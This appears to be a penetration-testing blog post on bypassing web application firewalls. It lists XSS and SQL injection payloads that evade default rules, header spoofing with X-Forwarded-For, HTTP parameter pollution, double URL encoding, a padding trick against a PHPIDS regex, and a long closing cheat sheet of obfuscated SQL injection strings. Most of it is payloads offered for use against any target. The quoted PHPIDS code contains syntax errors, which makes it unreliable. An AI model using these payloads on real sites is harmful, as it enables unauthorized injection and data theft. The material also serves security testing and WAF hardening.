---
author: "Jann Moon"
title: "Non-Discriminatory WAF Torment"
description: "Non-exclusionary and adaptable WAF Bypasses to Try Against Any Adversary."
tags: ["WAF", "Bypass", "BugBounty"]
date: 2022-07-14
thumbnail: floral3.jpg
---

For penetration testers and attackers, dealing with WAFs can be an often frustrating experience.  However, creativity and perserverence will be your greatest assets in the often-tedious tasks of enumerating the firewall's rules and settings through deductive reasoning.  This is almost always a black-box set of trials, akin to a game of "Go Fish" in the short-term and the usual Cat-and-Mouse game common to cybersecurity in the long term.  Luckily, many organizations misconfigure their WAFs and many imaginative combinations of bypasses can elude defensive expectations, allowing you to fire that harmless and satisfying "Alert(1)" box, against any firewall (well, hopefully). 

WAFs are much simpler to configure than a comprehensive antivirus solution covering entire operating systems or networks.  WAFs are deployed on specific endpoints and analyze incoming traffic, filtering suspicious requests to prevent various attacks from firing (SQLI, CSRF, XSS, Deserialiization, etc..).  

Generally, a WAF bypass will be one of these three types.

1. **Pre-Processor:** the WAF skips the input validation completely
2. **Impedence Mismatch**: the WAF interprets the input differently than the server
3. **Rule set bypass**: the payload is too sneaky or futuristic for the WAF

WAF rulesets can include settings that alter a certain input, sanitizing it and preventing it from being passed to the server in a harmful way.  Noticing certain behaviors may trigger WAFs to automatically block the source IP immediately or block a certain specific User-Agent or other header unique to the user.  Headers and IPs can be changed, and setting up Macros or Intruder settings in Burp to bypass these safeguards is the answer for extended testing.

Oftentimes, success coincides with patience and analytical thinking, as opposed to throwing fat polyglot payloads will usually waste your time.  Oftentimes, the trick is something subtle and simple, just uncommon or nonexistant in payloads lists.

Take your time and fuzz the input intelligently (usually manually), so you can figure out a bypass if you suspect a vulnerability nearby.

# **Bypass methods:**

If a WAF is enabled, it can be assumed it will likely protect the server against the most common attacks that attacker's and automated tools use to test for vulnerabilities.  Here are some common modifications that can bypass certain WAFs, activated with the default rulesets they come with.

**BLOCKED**          
```js
' or 1=1--          

alert(1)           

<script>alert(1)</script>   

1 or 1=1

eval(name)
```

 **Undetected**
```js
' or 2=2--
 
 $00alert(525)

<script type=vbscript>MsgBox(0)</script>

(1)or(1)=(1)

x=this.name; X(0?$:name+1)
```

## Fingerprinting WAFs

Another tool in discovering WAF bypasses involves enumerating the target system and provoking the WAF to reveal itself.  Oftentimes, WAF bypasses can be found online before they are patched. Eventually, you will also learn which WAFs are commonly misconfigured in which ways.

WAFs generally reveal themselves via:
  - Uncommon Response codes 
  - Security signatures in response headers
  - Proudly declaring themselves when blocking your request
  - Side-channel attacks invoking certain response times (although you most likely won't need to go this far)

The easiest, fastest and most accurate method is probably to use wafw00f, a WAF fingerprinting toolkit available in the Kali repos or at Github below.

[WafW00f on Github](https://github.com/EnableSecurity/wafw00f)

I don't know how noisy this tool is, though I'd guess it throws a lot of requests and matches an expected response to it for enumeration.  Seeing a packet that can be traced to this tool would be a clear signal that someone is attacking the server, as a normal employee would not ever need to use this tool.

You can also fingerprint easily with Nmap and Burp Suite.  

## Header Bypasses

Figuring out that the WAF is tracking a specific header's value can allow you to randomize the header's values in your fuzzing sessions to avoid being blocked.  Also, values such as "localhost" or "0.0.0.0" can sometimes bypass WAFs, as it assumes the developer is working at the server's location.   

• X-Originating-IP   
• X-Forwarded-For   
• X-Remote-IP   
• X-Remote-Addr  
  
### HTTP Method Madness

Rulesets are often set only for expected verbs like "GET", "POST" or "PUT" but a random HTTP verb can elude it.

### **HTTP Parameter Pollution**  
  
As mentioned earlier, a WAF can parse an input differntly then the back-end server, allowing attackers to sneak by.  Doubling up a parameter, albeit with different values can lead to a successful bypass. 

Consider the following example:
```
/?productid=1&productid=2
```

- **ASP.NET** parses it into "`productid=1,2"`  
- **JSP** parses it into "`productid=1"`  
- **PHP** parses it into `"productid=2"`

### **Combining SQL Injection and Parameter Pollution**  
  
A legitimate SQL query like below...  

```text
?productid=select 1,2,3 from table
```
Polluting can lead to a variety of conclusions based on the language of the web app and the rulesets by the WAF.  

```text
?productid=select 1&productid=2,3 from table
```

This is where manual testing is crucial, as payload lists could never account for all the combinations of servers, parameters, WAFs and their associated rules customized to each organization. 


  
## Encodings

Various encodings (and especially, combinations of them) are commonly used to bypass weak WAF rules.
Commonly used encodings include hex, URL and double URL.  
```js  
`1 union select 1,2,3  

 ’s’ -> %73 -> %25%37%33   

1 union %25%37%33elect 1,2,3`
````

The `s` via URL encoding becomes `%73`, which can be encoded again to create `%25%37%33`.

# Other Interesting Bypasses

Certain rules can be set up in strange ways that are unpredictable.  

The following is from PHPIDS open-source WAF and is executed on all inputs received from users.

```php
public static function convertFromRepetition($value)
{
// remove obvious repetition patterns
$value = preg_replace{(
'/(?:(.{2,})\1{32,})|(?:[+=|\-@\s]{128,})/',
'x',
$value
);
return $ value;
}
```
The above excerpt comes from the IDS_Converter class found in the `Converter.php` file and contains the vulnerable regex shown above.  

Commonly troubling characters are replaced, but only for the first 33 times they are matched.  Therefore, attacks like XSS payloads, SQL injections and LFI attacks would all bypass the WAF - as long as you copy and paste them more than 33 times in your input. To make it easier, you can just copy this before any payload for successful exploitation.
```php
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%
s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s <PAYLOAD HERE>

```

## Path Parameter Exploitation

Many WAFs also do not anticipate attacks that modify the URL path in unexpected ways. The following attacks have worked against Apache on some servers.

Adding a slash at the end of a URL, some junk characters and parameters followed by a payload. 
```
example.com/giant/pig.php/haku?userid=1PAYLOAD
```

Using a semicolon and more unexpected parameter madness.
```
example.com/giant/pig.php;param=value?userid=1PAYLOAD
```

Even this, a lone semicolon is enough.
```
example.com/giant;/pig.php?userid=1PAYLOAD

```

## Payload Ideas to Hassle WAFs with

Below are some common and quick examples of ways to tamper with payloads to try to enumerate a WAFs ruleset.  Note: BLasting all of these into a parameter will be very unlikely to do anything but inconvenience you by being quickly banned.

```
`1 or 1=1   
1' or ''='   
1" or ""="   
1' or true#   
1" or true#   
1 or true# etc.`   
  
`or '1   
|| '1   
null' || 'a'=_binary'a   
1' || 'a'=x'61   
1' && '0'=x'30   
1' %26%26 %270%27%3dx'30   
2' && 0.e1=_binary"0   
1 or 1.e1=0b1010   
' || 1 like 1   
'-'   
"-"   
' || 2 not like 1   
110 or x'30'=48   
'1'!=20   
1 or 20!='1'   
2 and 2>0   
3 || 0<1   
12 || 0b1010<0b1011   
0b11 || 0b1010x'30'   
1 or 0b1   
2121/**/||21   
111' or _binary'1   
1 or 2121   
1' or 12 rlike '1`

`%55nion(%53elect)   
union%20distinct%20select   
union%20%64istinctRO%57%20select   
union%2053elect   
%23?%0auion%20?%23?%0aselect   
%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect   
%55nion %53eLEct   
u%6eion se%6cect   
unio%6e %73elect   
unio%6e%20%64istinc%74%20%73elect   
uni%6fn distinct%52OW s%65lect   
%75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%74`

@ **Normal Hex**  
`select 0x313131`   
**Hexed Bypass Version**   
`select x'313131';`   
**Binary Bypass**   
`select 0b011110100110010101101110;`   
**Bypass using functions**   
`select unhex(x'333133313331');`
```